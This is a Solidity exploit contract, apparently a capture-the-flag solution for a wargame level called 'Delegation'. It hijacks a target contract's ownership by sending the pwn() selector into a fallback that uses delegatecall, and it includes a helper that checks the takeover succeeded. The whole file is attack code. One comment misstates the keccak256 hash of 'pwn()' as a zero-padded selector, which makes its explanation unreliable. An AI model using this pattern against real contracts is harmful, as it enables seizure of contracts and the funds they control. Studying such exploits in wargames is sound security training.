// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDelegation {
    function owner() external view returns (address);
}

contract DelegationExploit {
    IDelegation public targetContract;
    
    constructor(address _targetAddress) {
        targetContract = IDelegation(_targetAddress);
    }
    
    // This function will exploit the Delegation contract by triggering
    // the pwn() function through delegatecall
    function exploit() external {
        // Get the function signature for pwn()
        // keccak256("pwn()") = 0xdd365b8b0000000000000000000000000000000000000000000000000000000000000000
        // We only need the first 4 bytes
        bytes4 pwnSignature = bytes4(keccak256("pwn()"));
        
        // Call the Delegation contract with the function signature
        // This will trigger the fallback function which uses delegatecall
        (bool success, ) = address(targetContract).call(abi.encodeWithSelector(pwnSignature));
        require(success, "Exploit failed");
    }
    
    // Helper function to check if the exploit was successful
    function checkOwnership() external view returns (address) {
        return targetContract.owner();
    }
}
